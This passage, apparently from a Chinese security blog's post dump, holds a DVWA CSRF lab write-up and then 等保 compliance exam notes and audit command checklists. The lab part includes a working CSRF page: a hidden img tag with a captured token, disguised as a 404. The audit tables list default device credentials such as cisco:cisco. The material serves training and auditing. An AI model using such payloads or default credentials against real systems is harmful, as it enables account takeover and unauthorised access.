每次用户修改密码时，服务器会返回随机的token。（下一次请求需要的token隐藏在这一次响应的报文中）\ngenerateSessionToken();\n?>\n\n3.2 尝试攻击\n正常修改密码抓包发现，请求头中多了一个user_token参数，在响应报文中找到下一次请求需要的user_token：构造攻击csrf_high.html页面：&lt;img src=\"http://192.168.117.129/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=199422ab6cb786bf4f14219bbc82bea5#\" border=\"0\" style=\"display:none;\"/>\n&lt;h1>404&lt;h1>\n&lt;h2>file not found.&lt;h2>访问csrf_high.html后，修改密码成功。  \n\n4.Impossible_level4.1 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// Check Anti-CSRF token\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n// Get input\n$pass_curr = $_GET[ 'password_current' ];\n$pass_new = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Sanitise current password input\n$pass_curr = stripslashes( $pass_curr );\n$pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_curr = md5( $pass_curr );\n// Check that the current password is correct\n$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );\n$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );\n$data->execute();\n// Do both new passwords match and does the current password match the user?\nif( ( $pass_new == $pass_conf ) &amp;&amp; ( $data->rowCount() == 1 ) ) &#123;\n// It does!\n$pass_new = stripslashes( $pass_new );\n$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_new = md5( $pass_new );\n// Update database with new password\n$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );\n$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );\n$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n$data->execute();\n// Feedback for the user\necho \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n// Issue with passwords matching\necho \"&lt;pre>Passwords did not match or current password incorrect.&lt;/pre>\";\n&#125;\n&#125;\n// Generate Anti-CSRF token\ngenerateSessionToken();\n?>\n\nPDO技术防御SQL注入，PHP 数据对象（PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。实现 PDO 接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。也就是采用了预处理的方式将运行语句与参数隔离。  \n防护CSRF，则要求用户输入原始密码（简单粗暴），前提是协议传输没有问题，攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。\n\n\n","categories":["渗透测试"],"tags":["DVWA","CSRF"]},{"title":"“差异”题","url":"/e0b816a7.html","content":"三级与二级的差异\nQ:《基本要求》中，在应用安全层面的访问控制要求中，三级系统较二级系统增加的措施有哪些？A:1）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。3）应对重要的主体和客体设置安全标记，并控制主体对有安全标记的信息资源的访问。\n\n\nQ:二级中，应根据会话状态信息数为数据流提供明确的允许或拒绝访问能力，控制粒度为网段级？A:正确  \n\n《基本要求》/安全区域边界/访问控制：三级应对进出网络的数据流实现基于应用协议和应用内容的访问控制。\n三级为端口级，二级为网段级。  \n\n\n\nQ:应用层软件软件的容错，三级比二级多了什么要求？A:应提供自动保护功能，当故障发生时自动保护当前所有状态，保证系统能够进行恢复。  \n\n《基本要求》/安全计算环境/数据备份与恢复(三级与二级的差异)：应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。应提供重要数据处理系统的热冗余，保证系统的高可用性。\n\n\n等保2.0与1.0的差异\nQ:等保1.0和等保2.0的区别？A:    \n\n\n\n等保\n2.0\n1.0\n\n\n\n\n名称\n《信息安全技术网络安全等级保护基本要求》\n《信息安全技术系统安全等级保护基本要求》\n\n\n定级对象\n信息系统、基础信息网络、云计算平台、大数据平台、物联网系统、工业控制系统、采用移动互联技术的网络等\n信息系统\n\n\n安全要求\n安全通用要求与安全扩展要求\n安全要求\n\n\n措施分类结构变化\n技术： 安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心 管理： 安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n技术： 物理安全、网络安全、主机安全、应用安全、数据安全 管理： 安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理\n\n\n内容变化\n定级-备案-建设整改-等级测评-监督检查+新的安全要求(风险评估、安全监测、通报预警、态势感知等)\n定级-备案-建设整改-等级测评-监督检查\n\n\n\n\n其他\nQ:IDS和IPS的区别？A: IDS的工作模式为杂合模式，使用SPAN技术侧挂在主干上，单独工作能够检测但无法抵御；IPS的工作模式为在线模式，直接部署在主干上，根据流量策略，单独工作能够检测并抵御异常流量。   \n\n\nQ:HIDS和NIDS的区别？**A: \n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"命令相关题目","url":"/8c54db8b.html","content":"网络设备路由器/交换机1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。    \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n身份认证、用户口令配置\n存在”username x privilege x password x…”\n\n\nCisco/show run\n身份认证配置\n启用AAA服务器”aaa authentication login/enable…”\n\n\n华为、H3C/display current-configuration\n身份认证、用户口令配置\n存在”local-user x password irreversible-cipher…”\n\n\nH3C/display password-control\n用户口令配置\n存在”password-control aging/length/history…”\n\n\nCisco/enable secret 或 enable password\n特权用户设置口令\n\n\n\n1.2 应具有登陆失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nH3C/display password-control\n登陆一定次数后进行账户锁定\n存在”password-control login-attempt x exceed locktime x”\n\n\nCisco/华为\n连续登录5次即锁定10分钟\n\n\n\nCisco/show run\n超时断连\n“exec-timeout x”\n\n\n华为/display current-configuration\n超时断连\n“idle-timeout x”\n\n\n\n1.3 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n使用SSH\n“ip ssh time-out x;ip ssh authentication-retries x;transport input ssh…”\n\n\n华为、H3C/display current-configuration\n\n“service-type ssh level x;ssh user x authentication-type x;protocal inbound ssh…”\n\n\n\n1.4 应采用双因子认证。    \n\n2.访问控制\n2.1 应对登录的用户分配账户的权限。  \n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n设备\n默认账户：口令\n预期\n\n\n\n\nCisco\ncisco：cisco\n默认账户被删除或重命名，默认口令被修改\n\n\nCisco\nCisco：cisco\n\n\n\n华为\nadmin：admin\n\n\n\n华为\nhuawei：admin@huawei.com\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n身份认证配置\n“username x privilege x password x…”都是必要的\n\n\n华为、H3C/display current-configuration\n\n“local-user x privilege level x…”都是必要的\n\n\n\n2.4 管理用户权限分离&amp;最小权限原则。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n身份认证配置\n“username x privilege x password x…”各用户权限分离且最小\n\n\n华为/H3C：display current-configuration\n\n“local-user x privilege level x…”各用户权限分离且最小\n\n\n\n【不适用】2.5 应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。【不适用】2.6 访问控制的粒度达到主体为用户级或进程级，客体为文件、数据库表级。【不适用】2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。    \n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n审计日志\n“logging on;logging trap debugging;loging x.x.x.x;service timestamps log datetime…”\n\n\n华为/H3C：display current-configuration\n\nInfo-center enable;…Snmp-agent…”\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、时间是否成功及其他与审计相关的信息。3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。    \n\n4.入侵防范\n【不适用】4.1 应遵循最小安装的原则，仅安装需要的组件和应用程序。4.2 应关闭不需要的系统服务、默认共享和高危端口。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/sh running\n实际网络环境配置\n“no service x;no x run;no ip x…”\n\n\n华为/H3C：display current-configuration\n\n“ip x shutdown…”\n\n\n\n4.3 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n访问控制列表\n“access-list x permit/deny x;access-x …”\n\n\n华为/H3C：display current-configuration\n\n“acl number x…”\n\n\n\n【不适用】4.4 应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求。4.5 应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞。【不适用】4.6 应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。   \n\n5.可信验证\n5.1 可基于可信根对通信设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。   \n\n服务器Linux1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。    \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/passwd\n记录用户属性，包括用户名、密码、用户标识、组标识等\n无空口令用户\n\n\n/etc/shadow\npasswd中不再直接记录口令，将shadow作为真正的口令文件(需root权限)\n\n\n\n/etc/login.defs 和 /etc/default/useradd\n(默认)登陆程序的配置文件,可配置密码参数\n存在密码的设置\n\n\n/etc/pam.d/system-auth  (Redhat、CentOS和Fedora)\n优先级高于login.defs\n\n\n\n/etc/pam.d/common-passwd  (Debian、Ubuntu和LinuxMint)\n优先级高于login.defs\n\n\n\n1.2 应具有登陆失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/login.defs\n(默认)登陆程序的配置文件,可配置密码参数\n本地登陆失败处理：%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%;远程登陆失败处理：%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%\n\n\n/etc/pam.d/system-auth  (Redhat、CentOS和Fedora)\n优先级高于login.defs\n\n\n\n/etc/pam.d/common-passwd  (Debian、Ubuntu和LinuxMint)\n优先级高于login.defs\n\n\n\n/etc/profile\n配置了超时锁定参数\nTIMEOUT=300s\n\n\n\n1.3 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice -status-all &#124; grep sshd\n查看是否运行了sshd服务\n应运行\n\n\nnetstat -an &#124; grep 22\n查看相关端口是否已打开\n应打开\n\n\nservice –status-all &#124; grep running\n查看是否使用Telnet\n应未使用Telnet\n\n\n\n1.4 应采用双因子认证。  \n\n2.访问控制\n2.1 应对登录的用户分配账户的权限。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nls -a &lt;目录名或文件名&gt;\n(r,4)(w,2)(x,1)(-,0)\n配置文件≤644；可执行文件≤755\n\n\n\n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/shadow\n查看是否存在adm、lp、shutdown、halt、mail、uucp、games、ftp等默认无用账户\n应不存在\n\n\n/etc/ssh/sshd_config\n参数PermitRootLogin是否为no\n应为no，表示不允许root远程登陆(ssh)\n\n\n(AIX:)/etc/security/user\n参数rlogin\nrlogin=False，不允许root远程登陆\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/shadow\n查看是否存在adm、lp、shutdown、halt、mail、uucp、games、ftp等默认无用账户\n应不存在\n\n\n\n2.4 管理用户权限分离&amp;最小权限原则。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/passwd\n查看非默认账户\n管理用户权限分离，权限应符合最小权限原则\n\n\n/etc/sudoers\n查看有哪些用户能够使用sudo命令授予其他用户root权限\n应只有root\n\n\n\n2.5 应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2.6 访问控制的粒度达到主体为用户级或进程级，客体为文件、数据库表级。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nls -a &lt;目录名或文件名&gt;\n(r,4)(w,2)(x,1)(-,0)\n配置文件≤644；可执行文件≤755\n\n\n\n2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/selinux/config\n参数SELinux(enforcing/permissive/disabled)\nLinux默认关闭SELinux，或者已使用第三方主机加固系统或对系统内核进行了二次开发加固(需实际查看系统可视化界面)\n\n\n\n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice syslog status\n系统日志服务\n应开启\n\n\nservice audit status 或 service -status-all &#124; grep audit\n是否开启审计进程\n应开启，若无则应部署了第三方安全审计工具\n\n\nps -ef &#124; grep auditd\n是否开启安全审计的守护进程\n应开启\n\n\n/etc/audit/audit.rules\n指定如何写入审查记录以及在哪里写入、日志超出可用磁盘空间后如何处理等\n记录了文件和底层调用信息，记录的安全事件较为全面\n\n\n/etc/audit/filesets.conf 或 filters.conf\n指定内核用来判定系统调用是否要审查的规则\n应启用“@priv-ops”“@mount-ops”“@system-ops”\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、时间是否成功及其他与审计相关的信息。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nausearch -ts today\n查看今天以后的日志\n审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果\n\n\ntail -20 /var/log/audit/audit.log\n查看审计日志\n审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果\n\n\naucat &#124; tail -x\n查看最近的x条审计记录\n\n\n\naugrep -e TEXT -U AUTH-success\n查看所有成功的PAM授权\n\n\n\n3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。  \n\n4.入侵防范\n4.1 应遵循最小安装的原则，仅安装需要的组件和应用程序。   \n\n\n\n命令\n注释\n预期\n\n\n\n\nyum list installed\n查看已安装的程序包\n其中应无当前不需要使用的组件和应用程序\n\n\n\n4.2 应关闭不需要的系统服务、默认共享和高危端口。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice –status-all &#124; grep running\n查看多余的网络服务是否关闭\n应关闭\n\n\nnetstat -ntlp\n查看是否关闭非必须的端口\n应关闭\n\n\n\n4.3 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/hosts.deny\n访问本机ip黑名单\n应有”ALL:ALL”\n\n\n/etc/hosts.allow\n访问本机ip白名单\n应有”sshd:192.168.xxx.xxx/255.255.255.0”\n\n\n\n4.4 应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nrpm -qa &#124; grep patch\n查看补丁安装情况\n补丁更新时间为最近。已对补丁进行控制和管理。\n\n\n\n4.5 应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nfind /-name -print\n查看是否安装了主机入侵检测软件\n应有安装\n\n\n\n\n5.恶意代码防范\n5.1 应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。  \n\n6.可信验证\n6.1 可基于可信根对通信设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。  \n\n数据库Oracle1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“PASSWORD_VERIFY_FUNCTION”\n口令复杂度函数\n不为UNLIMITED\n\n\nutlpwdmg.sql文件的“–Check for the minimum length of the password”部分\n口令最小长度规则\n”length(password)&lt;”后的值≥8\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“PASSWORD_LIFE_TIME”\n口令过期时限\n不为UNLIMITED\n\n\n\n1.2 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=”FAILED_LOGIN_ATTEMPTS”\n登陆失败次数\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=”FAILED_LOCK_TIME”\n登陆失败口令锁定时间\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=”IDLE_TIME”\n登陆超时退出时长\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=”DEFAULT” and resource-name=”CPU-PER-SESSION”\n一个会话可以使用的CPU时间\n不为UNLIMITED\n\n\nselect limit from dba-profiles where profile=”DEFAULT” and resource-name=”SESSION-PER-USERS”\n每个用户所允许的并行会话数\n不为UNLIMITED\n\n\n\n1.3 当进行远程管理时，应采取必要的措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n执行lsnrctl status &lt;监听器名&gt; 或 查看文件$ORACLE_HOME/network/admin/listener.ora中LISTERENR的PROTOCAL和PORT\n服务端Oracle监听器监听的网络协议，应启用SSL加密\nprotocol(TCPS);port(2484)\n\n\n查看文件$ORACLE_HOME/network/admin/tnsnames.ora中LISTERENR的PROTOCAL和PORT\n客户端应启用SSL加密\nprotocol(TCPS);port(2484)\n\n\n查看文件$ORACLE_HOME/network/admin/sqlnet.ora中WALLET_LOCATION、SQLNET.AUTHENTICATION_SERVERS、SSL的相关配置\n服务端和客户端的配置文件\n应有SSL的相关配置\n\n\n查看文件$ORACLE_HOME/network/admin/sqlnet.ora中SQLNET.ENCRYPTION_SERVER;SQLNET.ENCRYPTION_TYPES_SERVER。SQLNET.CRYPTO_CHECKSUM_SERVER;SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER\nSQLNET.ENCRYPTION_SERVER–required；SQLNET.ENCRYPTION_TYPES_SERVER–此处指定的加密算法应不为已被证明不安全的算法，如DES、3DES。  SQLNET.CRYPTO_CHECKSUM_SERVER–required；SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER–此处指定的加密算法应不为已被证明不安全的算法，如DES、3DES。\n\n\n\n1.4 双因子认证。  \n\n2.访问控制\n2.1 应对登录的用户分配账户和权限。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect * from dba_users\ndba_users策略\nMGMT_UIEW、SYS、SYSTEM、DBSNMP、SYSMAN为启用状态，其他均为锁定状态\n\n\n\n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect * from dba_users\ndba_users策略\nSYS口令应不为CHANGE_ON_INSTALL;SYSTEM口令应不为MANAGER;DBSNMP口令应不为DBSNMP\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username,account_status from dba_users\ndba_users策略\n返回结果应不存在范例账号scott、outln、ordsys,过期账户account_status=expired,返回结果应一一对应\n\n\n\n2.4 应授予管理用户所需的最小权限，实现管理用户的权限分离。2.5 应由授权主题配置访问控制策略，访问控制策略规定主体对客体的访问控制规则。2.6 访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username from dba_users\ndba_users策略\n应安装Oracle Label Security模块：返回用户中存在LBACSYS\n\n\nselect policy_name,status from DBA_SA_POLICIES\n策略创建情况\n存在status=enable的标签策略\n\n\nselect * from dba_sa_levels ORDER BY level_num\n级别创建情况\n查询结果不为空\n\n\nselect * from dba_sa_labels\n标签创建情况\n查询结果不为空\n\n\nselect * from dba_sa_tables_policies\n了解用于存储重要数据的表的名称\n查询结果不为空，且包含重要数据所在表的名称\n\n\n\n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要用户行为和重要安全事件进行审计。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect value from v$parameter where name=’audit_trail’\n查看是否开启审计功能\naudit_trail 不为 none\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nSQL&gt;show parameter background_dump_dest\n查询日志文件位置\n（默认）$ORACLE/rdbms/log\n\n\nSQL&gt;select log_mode,force_logging from v$database;\n查询数据库的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\nSQL&gt;select tablespace_name,logging,force_logging from db_tablespaces;\n查询表空间的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\nSQL&gt;select table_name,logging from user_tables;\n查询对象的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\n\n3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nalter system set audit_trail=none\n关闭审计进程\n除审计人员外，其他人无法对审计进程进行开启关闭\n\n\n\n\n4.入侵防范\n4.1 最小安装原则。4.2 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。   \n\n\n\n命令\n注释\n预期\n\n\n\n\n查看sqlnet.ora文件中tcp.validnode_checking和tcp.invited_nodes\n启用相应配置\ntcp.validnode_checking=yes；tcp.invited_nodes参数已配置IP地址列表\n\n\n\n4.3 应提供数据有效性校验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求。   \n\n\n\n命令\n注释\n预期\n\n\n\n\n–cd $ORACLE_HOME/Opatch opatch lsinventory\n了解Oracle数据库的补丁升级机制\nOPatch和OUI的版本较新\n\n\n\n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"概念题目","url":"/be97aa85.html","content":"等保2.0信息安全等级保护定义：对国家秘密信息、法人和其他组织及公民的专有信息以及公开信息和存储、传输、处理这些信息的系统分等级实行安全保护，对信息系统中使用的信息安全产品实行按等级管理，对信息系统中发生的信息安全事件分等级响应、处置。等保2.0重点强调的关键技术包括：可信计算技术、强制访问控制、审计追查技术、结构化保护技术、多级互联技术等保2.0的一个中心，三重防护，分别指的是什么：“一个中心”指“安全管理中心”；“三重防护”指“安全计算环境”“安全区域边界”“安全通信网络”。等保2.0建设核心思想是：1）以可信认证为基础，构建一个可信的业务系统执行环境。2）以访问控制技术为核心，实现主体对客体的受控访问。3）构建集中管控、最小权限管理与三权分立的管理平台。等级保护工作有几项规定动作：5项：定级-备案-建设整改-等级测评-监督检查信息安全等级保护的首要环节是：定级/备案信息安全等级保护的关键是：建设整改使信息系统保护能力不断提高的保障是：监督检查第几级开始增加“抗抵赖性”的要求：第三级等保测评常用方法查看配置：登录安全设备、网络设备、主机、数据库、应用系统等查看设备或应用自身的配置文件或者设置。等保测评常用方法调研访谈：业务访谈、资产访谈、安全技术访谈、安全管理访谈等保测评常用方法查看资料：管理制度的详细分析和对标分析；管理策略的详细分析和对标分析测评对象选择五大原则：重要性、代表性、完整性、安全性、共享性S-业务信息安全。保护数据在存储、传输、处理过程中不被泄露、破坏和免受未授权的修改的信息安全类要求。A-系统服务安全。保护系统连续正常运行，免受对系统的未授权修改、破坏而导致系统不可用的服务保证类要求。G-通用安全保护类要求，G为S、A中最高的数字级别。\n定级备案定级工作流程一般有几项：5项：确定定级对象-初步确定等级-专家评审-主管部门审核-备案审核定级过程中，初步确定等级为哪一级可自行确定最终保护等级：第一级网络运营者应当在哪个阶段确定网络的安全保护等级：规划设计阶段，按照信息系统等级，同步规划、同步设计、同步实施安全保护技术措施和管理措施。第二级及以上的系统，网络运营者应当在网络的安全保护等级确定后10个工作日内，到县级以上公安机关报备。定级对象定义为：网络安全等级保护工作直接作用的对象，包括信息系统、通信网络设施和数据资源。作为定级对象的信息系统应具有三个特征：具有确定的主要安全责任主体、承载相对独立的业务应用、包含相互关联的多个资源定级要素：受侵害客体、对客体的侵害层度  \n通用安全物理环境隔离技术中，安全性最好的是：物理隔离  \n安全通信网络等保2.0安全通信网络层面 三级系统应提供什么的硬件冗余，保证系统的可用性：通信线路、关键网络设备、关键计算设备  \n安全区域边界等保三级中，恶意代码应该在哪里进行检测和清除：网络边界  \n安全计算环境Windows系统默认terminal services服务所开放的端口为：3389win2000中审核账户登录是审核：域控制器接受一个验证用户账户的请求Windows中的power users组是否默认具有对事件日志的删除权限：否，poweruser组即超级用户组，只具备部分管理员权限。  \n超时自动断连：(Cisco)exec-timeout；(华为)idle-timeoutcisco的配置通过什么协议备份：TFTPcisco通过什么方式将日志发送到日志服务器：syslog或SNMP交换机可以通过什么来限制数据流的最大流量：ip、协议、端口网络连接数路由器可以通过什么来限制带宽：ip、用户、协议路由器中，若去往同一目的地有多条路由，则决定最佳路由的因素有：路由的优先级和路由的metric值用户登录路由器的主要方式有：利用控制台端口通过本地连接登录、利用辅助端口(AUX)通过调制解调器(MODEM)进行本地连接登录、利用虚拟终端(VTY)通过TCP/IP网络进行远程登录  \n三级系统中，MS SQLserver的审核级别为：全部在Sybase中，如果不存在sybsecurity库，则说明未安装审计工具。Oracle中什么命令可以删除整个表中的数据且无法回滚：TruncateOracle中的系统文件：数据文件DBF、控制文件CLT、日志文件LOGOracle中Oracle Audit Vault安全模块的功能是：日志分析  \nOSPF使用什么来计算到目的网络的开销：带宽OSPF使用链路状态算法：链路状态是对网络拓扑结构的描述；通告的路由信息携带信息的创建者，链路状态算法本身不会产生自环路由。RIP：对路由的描述；路由器之间传递的路由信息中不携带信息的创建者(水平分割/毒性逆转)    \n强制访问控制策略最显著的特征是：全局性、永久性功能测试不能实现什么功能：全局访问控制策略配置访问控制列表：不必制定日志主机访问控制的三要素是：主体、客体、操作访问控制按策略划分可分为：自主访问控制、强制访问控制、基于角色的访问控制访问控制按层面划分可分为：网络访问控制、主机访问控制、应用访问控制、物理访问控制  \n网络安全审计指通过对网络边界或重要网络节点的流量数据进行分析，从而形成的网络安全审计数据。网络安全审计包括：网络流量审计和网络安全事件审计。网络安全审计系统一般包括：网络探测引擎、数据管理中心、审计中心安全审计按对象可分为哪些类，各类审计内容是什么：    系统级审计：要求至少能够记录登陆结果、登陆标识、登陆尝试的日期和时间、退出的日期和时间、所使用的设备、登陆后运行的内容、修改配置文件的请求等。    应用级审计：跟踪监控和记录诸如打开和关闭数据文件，读取、编辑和删除记录或字段的特定操作以及打印报告之类的用户活动。    用户级审计：跟踪通常记录用户直接启动的所有命令、所有的标识和鉴别尝试的所有访问的文件和资源。  \n入侵威胁：外部渗透、内部渗透、不法行为入侵行为：物理入侵、系统入侵、远程入侵被动网络攻击：窃听、口令嗅探入侵检测系统分为：主机型入侵检测系统HIDS和网络型入侵检测系统NIDS查看入侵的重要线索：more /var/log/secure | grep refused入侵检测系统在进行信号分析时，一般通过三种常用技术手段：模式匹配、统计分析、完整性分析除了安装防病毒软件还有什么：安全补丁管理平台、防火墙、入侵检测系统、对系统和数据进行常备份防火墙提供的接入模式包括：网关模式、透明模式、混合模式、旁路接入模式包过滤防火墙是最基本最传统的防火墙，它只运行在：网络层和传输层按等保三级要求，防火墙应对网络上哪些协议进行命名级控制：http、ftp、telnet、pop3、smtp对于大型企业信息系统，补丁升级的理想的安全机制是：安装MicrosoftSUS服务器；把用户计算机设置自动更新可以有效(主动)阻止或发现入侵行为的有：部署IDS设备、主机防火墙、网络防火墙日志检查和分析(被动)  \n开展主机工具测试所必需了解的信息：操作系统、应用、ip  \n数据最好的口令存储方法：保存在TACACS+或RADIUS认证服务器上。CRC不能够提供和实现通信中数据完整性校验。备份方式有什么：全量备份、增量备份、差异备份IPsec通过什么来实现密钥交换、管理及安全协商：ISAKMAP/Oakley；SKIP测试和验证网络设备和安全设备的业务处理能力：综合网管平台、登陆设备查看相关配置访谈/查看设备配置文档  \n大数据大数据平台为了保障数据保密性应提供：静态脱敏、去标识化的工具或服务组件技术  \n云计算云计算安全防护技术框架，包括：云用户层、访问层、服务层、资源层、硬件设施层和管理层（跨层功能）   \n物联网物联网分为：感知层、网络传输层、处理应用层  